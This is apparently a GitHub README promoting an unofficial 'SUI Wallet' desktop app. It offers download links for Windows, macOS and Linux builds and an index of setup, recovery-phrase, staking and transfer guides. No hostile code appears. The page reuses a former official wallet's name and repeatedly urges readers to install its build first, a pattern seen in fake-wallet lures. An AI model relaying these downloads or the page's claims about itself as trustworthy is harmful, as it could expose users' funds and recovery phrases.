![SUI Wallet](assets/banner-profile.png)

# SUI Wallet

A native desktop wallet for Sui: self-custody, staking, Ledger and zkLogin.

[![License: Apache-2.0](https://img.shields.io/badge/LICENSE-Apache--2.0-4DA2FF?style=for-the-badge&labelColor=0D1117)](#license) [![Latest release: v0.2.6](https://img.shields.io/badge/RELEASE-v0.2.6-1F6FEB?style=for-the-badge&labelColor=0D1117)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/tag/v0.2.6)

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## What this repository is for

SUI Wallet is a desktop wallet for the Sui blockchain. It runs as a native application on Windows, macOS and Linux, holds the keys to an account on the machine it is installed on, and signs every transaction locally. Nothing about an account sits on a server run by this project, so the operator cannot move funds, freeze an account or restore a phrase on anyone's behalf.

That one design decision explains most of what follows. Because the keys are local, the recovery phrase *is* the account. Because the phrase is the account, a backup is a real task rather than a formality. Because there is no server holding a copy, an exposed phrase cannot be revoked, only abandoned by moving what it protects to a fresh account.

The three repositories below hold 61 guides written for the person who has decided to keep Sui keys on their own machine and now needs the steps to do it without losing anything. They cover the install on each platform, the phrase and first-run choices that protect an account, and the day-to-day work: transfers, fees, staking, hardware keys and sign-in. This page is the index; the guides themselves live in the repositories it points at, so a reader can start from the problem they actually have rather than from the top of a manual.

## Who it is for

- A reader who has been told to get a Sui wallet and does not yet know which file to download, or which of the products carrying that name is this one.
- Someone whose install finished but produced an application that never opens, or opens and closes.
- A person holding a recovery phrase on paper who is not certain it will bring the account back.
- A user about to move value, delegate a stake or pair a hardware key for the first time.

## Start here

1. [SUI Wallet desktop download: which build to take](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-desktop-download.md) - the three files in the release, and how to tell them apart.
2. [How to install SUI Wallet on Windows](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-install-sui-wallet-on-windows.md) - the Windows path from download to the first window.
3. [SUI Wallet seed phrase setup](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-seed-phrase-setup.md) - the 24 words that are the account, recorded once.
4. [How to send SUI from your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-send-sui-from-your-wallet.md) - address, amount, fee and the preview before approval.

## How to use these guides

1. Find your platform and architecture before anything else. A build for the wrong architecture downloads happily and then refuses to start, which reads like a broken app.
2. Take the file from the release page and match it against the published digest. A file from anywhere else has nothing to check it against.
3. Write the recovery phrase down during first run, on paper, before moving any value into the wallet.
4. Install the current release before troubleshooting. Every problem readers have reported is addressed in the build linked above, so an older build is the first thing to rule out.
5. Use the table below to jump to the repository that owns your question, then read the one guide that matches it.

## The guides grouped

| Repository | Guides | What it owns |
| --- | --- | --- |
| [install and repair guides](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting) | 14 | Getting the desktop app onto the machine and keeping it running. |
| [keys and login guides](https://github.com/sui-blockchain-wallet/key-safety-and-login) | 16 | What the wallet is, who holds the keys, and how access is restored. |
| [transfers and staking guides](https://github.com/sui-blockchain-wallet/onchain-transfer-guides) | 31 | Moving value, staking, hardware keys and sign-in. |

## What each guide changes

| Task | Guide | Outcome |
| --- | --- | --- |
| Get the app onto a machine | [How to install SUI Wallet on Windows](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-install-sui-wallet-on-windows.md) | A running wallet on a 64-bit Windows 10 or later system, opened from the installer in the current release. |
| Secure a new account | [Backing up your SUI Wallet recovery phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/backing-up-your-sui-wallet-recovery-phrase.md) | A written phrase that still restores the account after the computer is gone. |
| Recover an account | [Restoring SUI Wallet from a seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/restoring-sui-wallet-from-seed-phrase.md) | The funded address back in the wallet, with the phrase entered in order. |
| Move value | [How to send SUI from your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-send-sui-from-your-wallet.md) | A signed transfer whose effect was read on the preview screen before approval. |
| Earn on a holding | [Staking SUI in the wallet app](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-in-the-wallet-app.md) | A delegation to a chosen validator, with rewards accruing inside the position. |
| Keep keys off the machine | [Pairing Ledger with SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/pairing-ledger-with-sui-wallet.md) | A Ledger-backed account that signs on the device, with the note still in the wallet. |

## Common first questions

### Is SUI Wallet the same thing as the wallet that became Slush?

No. The Mysten Labs wallet that carried this name merged into Slush in April 2025, and this desktop application is a separate product. [what happened to Sui Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/what-happened-to-sui-wallet.md) separates the two, because the search term still reaches both.

### Does the wallet need an account, a licence key or a payment?

None of the three. The release assets are public, and the only thing standing between a download and a working wallet is the install itself.

### What happens if I lose the computer?

The account comes back from the 24-word phrase on any machine. That is why the phrase is the single most important thing to record, and why no guide here asks anyone to type it into a website.

### Which platforms are built?

Windows, macOS and Linux x64, from one release. There is no mobile build to look for, and the requirements column in the table above is the exact scope of each one.

## Before you install

Check the requirements in the table above against the machine you are using. A 32-bit Windows install and an ARM Linux machine both sit outside them, and both produce a download that fails to start rather than a clear refusal. [SUI Wallet system requirements](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-system-requirements.md) states the same three strings in full, with the architectures that are out of scope.

Then match the file against its digest. The SHA-256 values are published beside the assets on the release page and repeated in the application repository's README and release notes, which are the only two places this project prints them.

## About

The application, the two companion repositories and these guides belong to the same account. The desktop application lives in [the application repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop); the guides for moving value between Sui and an EVM chain sit in [the bridge repository](https://github.com/sui-blockchain-wallet/evm-sui); and the guides for listing objects on the Sui marketplace sit in [the marketplace repository](https://github.com/sui-blockchain-wallet/sui-nft-mkt).

The wallet is actively maintained. The current release is linked at the top of this page, and the release page is the only distribution channel this project uses.

## License

Apache License 2.0. The full text is in the application repository's [licence file](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/blob/HEAD/LICENSE), and a copy ships with every repository in this account that the guides are published from.

---

SUI Wallet is a self-custody desktop wallet for Sui. It is not affiliated with Mysten Labs, and it does not claim to be the ecosystem's official wallet. Nothing here is investment advice.
